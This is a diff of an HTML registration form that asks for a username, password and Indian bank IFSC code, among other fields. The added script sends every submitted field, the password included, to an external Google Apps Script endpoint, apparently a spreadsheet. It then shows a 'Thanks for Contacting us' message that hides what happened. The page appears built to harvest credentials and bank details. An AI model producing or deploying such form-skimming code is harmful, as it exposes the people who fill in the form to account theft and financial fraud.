@@ -29,7 +29,7 @@
   <body>
      <div class="container-fluid ">
          <div class="container">
-		     <form action="/action_page.html">
+		     <form  method="POST" name="google-sheet">
                  <div class="mb-3 mt-3">
                     <label for="Your Full Name" class="text-white">Username</label>
                     <input type="text" class="form-control" id="name" placeholder="Your Username" name="username">
@@ -44,7 +44,7 @@
                  </div>
 				 <div class="mb-3 mt-3">
                     <label for="Email" class="text-white">password</label>
-                    <input type="password" class="form-control" placeholder="Password" id="password" required>
+                    <input type="password" class="form-control" placeholder="Password" name="pswd" id="password" required>
                  </div>
 				 <div class="mb-3 mt-3">
                     <label for="Email" class="text-white">Confirm Password</label>
@@ -66,21 +66,27 @@
                     <label for="IFSC code" class="text-white">Your IFSC Code</label>
                     <input type="txtnumber" class="form-control" id="IFSC code" placeholder="Your IFSC Code" name="ifsccode">
                  </div>
-		<div class="mb-3">
-                    <label for="IFSC code" class="text-white">Your profile Photo</label>
-                    <input id="image" type="file" class="form-control" name="profile_photo" placeholder="Photo" required="" capture>
-                 </div>		 
+				 
                  
-				 <button type="button" class="btn btn-primary" id="btnSubmit" value="" onclick="ValidatePAN()" style="background-image: linear-gradient(to right, red , Orange);">
-				 <a href="index.html" class="text-decoration-none">Submit</a></button>
+				 
+				 <a href="index.html" class="text-decoration-none"><input type="submit" class="btn btn-primary" value="submit" name="submit"></a>
 			 
 			 </form>
         </div>
      </div>
 
 
-
-
+<script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbzGdz99LdD5BoIcfIxSf8zAh58BhOMsHGqyiXotNzYjTqxE8pQ95nuWqgJrhooZWG61/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
 
 
 <script type="text/javascript">
